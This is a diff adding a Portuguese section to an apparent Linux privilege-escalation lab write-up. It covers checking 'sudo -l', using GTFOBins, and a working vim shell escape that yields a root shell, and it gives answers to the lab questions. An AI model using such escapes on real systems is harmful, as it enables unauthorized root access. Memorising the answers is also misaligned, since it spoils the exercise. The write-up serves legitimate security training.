@@ -180,3 +180,53 @@ Outra forma, é adicionar um novo usuário com permissão de root, colocando a h
 ### Questões:
 
 - a. ***Run the "id" command as the newroot user. What is the result?*** *uid=0(root) gid=0(root) groups=0(root)*
+
+## 6 - Sudo - Shell Escape Sequences 
+
+Uma ação recomendada, após ganhar acesso a um host alvo, é verificar se o usuário que está logado possui alguma permissão sudo. Para isso:
+
+```shell
+sudo -l
+```
+
+Uma excelente fonte de consulta para aprender como explorar binários que estão autorizados no sudo é o [GTFOBins](https://gtfobins.github.io), a fim de se obter elevação de privilégios.
+
+```shell
+user@debian:~$ sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+```
+Apenas para ilustar, [link](https://gtfobins.github.io/gtfobins/vim/) do GTFOBins com informações de elevação usando o comando vim.
+
+Como os comandos estão configurados no sudo, eles são executados com permissão de superusuário. Portanto, é possível elevar privilégios usando alguns desses comandos.
+
+Exemplo como vim:
+
+```shell
+user@debian:~$ sudo vim -c ':!/bin/sh'
+
+sh-4.1# id
+uid=0(root) gid=0(root) groups=0(root)
+sh-4.1# 
+```
+### Questões:
+
+- a. ***How many programs is "user" allowed to run via sudo?*** *11* 
+
+- b. ***One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?*** *apache2*
+
+Para responder a questão b, basta realizar pesquisa no site GTFOBins.
+
